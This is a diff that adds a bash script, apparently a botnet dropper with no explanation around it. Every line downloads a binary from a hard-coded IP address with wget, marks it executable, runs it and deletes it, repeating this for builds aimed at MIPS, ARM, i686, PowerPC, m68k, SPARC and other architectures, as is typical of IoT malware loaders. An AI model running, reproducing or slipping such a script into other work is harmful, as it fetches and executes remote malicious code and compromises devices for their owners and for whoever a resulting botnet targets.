@@ -1,0 +1,13 @@
+#!/bin/bash
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://5.206.225.77/iluvmips; chmod +x iluvmips; ./iluvmips; rm -rf iluvmips
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://5.206.225.77/dannytyzoh; chmod +x dannytyzoh; ./dannytyzoh; rm -rf dannytyzoh
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://5.206.225.77/igisamzin; chmod +x igisamzin; ./igisamzin; rm -rf igisamzin
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://5.206.225.77/Ihaveablackpup; chmod +x Ihaveablackpup; ./Ihaveablackpup; rm -rf Ihaveablackpup
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://5.206.225.77/Armv4lkek; chmod +x Armv4lkek; ./Armv4lkek; rm -rf Armv4lkek
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://5.206.225.77/Armv5lkek; chmod +x Armv5lkek; ./Armv5lkek; rm -rf Armv5lkek
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://5.206.225.77/Armv6lkek; chmod +x Armv6lkek; ./Armv6lkek; rm -rf Armv6lkek
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://5.206.225.77/i686kek; chmod +x i686kek; ./i686kek; rm -rf i686kek
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://5.206.225.77/ppckek; chmod +x ppckek; ./ppckek; rm -rf ppckek
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://5.206.225.77/motorcycle; chmod +x motorcycle; ./motorcycle; rm -rf motorcycle
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://5.206.225.77/m68kek; chmod +x m68kek; ./m68kek; rm -rf m68kek
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://5.206.225.77/sparckek; chmod +x sparckek; ./sparckek; rm -rf sparckek
